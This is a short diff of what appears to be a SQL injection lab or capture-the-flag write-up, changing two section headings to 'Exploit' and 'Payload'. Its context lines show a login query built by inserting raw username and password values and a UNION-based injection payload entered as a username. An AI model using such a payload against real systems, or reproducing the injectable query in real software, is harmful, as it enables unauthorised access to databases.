@@ -182,7 +182,7 @@ elif user:
 
 |
 
-## 문제 풀이
+## Exploit
 
 ```sql
 SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
@@ -677,7 +677,7 @@ sqli_lab.`K0{`
 
 |
 
-## Exploit
+## Payload
 
 ```
 username: ' union select 1,(query),3 -- 1
